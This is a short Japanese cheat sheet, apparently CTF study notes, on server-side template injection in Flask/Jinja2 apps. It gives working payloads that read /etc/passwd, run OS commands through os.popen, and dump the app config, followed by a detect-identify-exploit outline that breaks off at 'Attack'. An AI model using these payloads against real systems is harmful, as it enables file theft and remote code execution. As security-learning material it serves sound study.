# Server Side Template Injection

## サーバ内ファイルの読み込み

- 既にサーバ上にあるフラグファイルへのパスが判明している場合
- OS コマンドが実行できない場合

### 実際の例

- テンプレート内で文字ではなくコードとして評価されるよう`{{...}}`で囲む
- `{{request.form.get.__globals__['__builtins__']['open']('/etc/passwd').read()}}`

## os コマンドの実行

- `{{request.form.get.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`

## config ファイルの取得

- `{{ config }}`
- `{{ config.items() }}`

## ブラックボックスでの見つけ方

- Detect
  - `{{ 1+1 }}`などでインジェクションの有無
- Identify
  - curl のレスポンスヘッダからサーバ側の技術スタックを調べる
    - `curl localhost:5000 -vvv`
  - [Black Hat p4](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)に記載の手順で実施
- Exploit
  - Read
    - テンプレートエンジンのドキュメントを読む
    - template authors
      - 基本構文や機能を確認
    - security consideration
      - セキュリティに関する考慮事項
      - 脆弱性や防御の抜け道
    - 組み込みメソッド・関数・フィルタ・変数のリスト
      - 利用可能な標準機能
    - エクステンションやプラグインのリスト
      - デフォルトで有効化されているもののチェック
  - Explore
    - 自己参照オブジェクトや名前空間オブジェクトを探す(self, namespace)
    - 利用可能なメソッドを列挙(`self.__class__.__mro__`, `namespace.items()`など)
    - 変数名のブルートフォース s
  - Attack
